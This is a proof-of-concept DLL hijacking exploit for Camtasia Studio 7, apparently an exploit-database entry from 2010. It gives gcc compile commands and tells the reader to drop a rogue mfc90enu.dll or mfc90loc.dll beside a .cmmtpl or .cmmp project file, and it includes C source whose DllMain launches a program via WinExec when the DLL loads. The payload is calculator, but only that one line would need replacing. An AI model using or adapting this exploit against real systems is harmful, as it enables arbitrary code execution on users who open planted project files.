Camtasia Studio 7 (mfc90enu.dll, mfc90loc.dll) DLL Hijacking Exploit
====================================================================

/*-------------------------------------------------------------------------*/
/**

  [*] Camtasia Studio 7  (mfc90enu.dll, mfc90loc.dll) DLL Hijacking Exploit
  
  [*] Date: 26/08/2010

  [*] Author: p4r4n0id
  
  [*] Vendor: Techsmith

  [*] Product Web Page: http://www.techsmith.com/camtasia.asp
      
  ----
  gcc -shared -o mfc90enu.dll evil_dll.c
 
  Compile and rename to mfc90enu.dll, create a file boom.cmmtpl or boom.cmmp and put
  both files in same dir, execute and do your math homework. :)
  
  
  gcc -shared -o mfc90loc.dll evil_dll.c
  
  Compile and rename to mfc90loc.dll, create a file boom.cmmtpl and put
  both files in same dir, execute and and do your math homework. :)
  
  ----

  
**/
/*--------------------------------------------------------------------------*/

#include <windows.h>


int calc();

BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{

	switch (fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		calc();
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

int calc()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}



